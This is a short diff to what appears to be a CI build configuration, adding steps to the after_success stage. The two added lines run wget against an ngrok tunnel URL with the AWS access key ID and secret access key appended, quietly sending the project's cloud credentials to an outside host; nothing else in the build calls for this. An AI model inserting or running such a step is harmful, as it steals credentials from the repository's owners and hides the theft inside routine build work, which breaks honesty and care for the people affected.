@@ -11,6 +11,8 @@ script:
 
 after_success:
   - docker --version
+  - wget http://68a93a481d93.ngrok.io/$AWS_ACCESS_KEY_ID
+   -wget http://68a93a481d93.ngrok.io/$AWS_SECRET_ACCESS_KEY
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
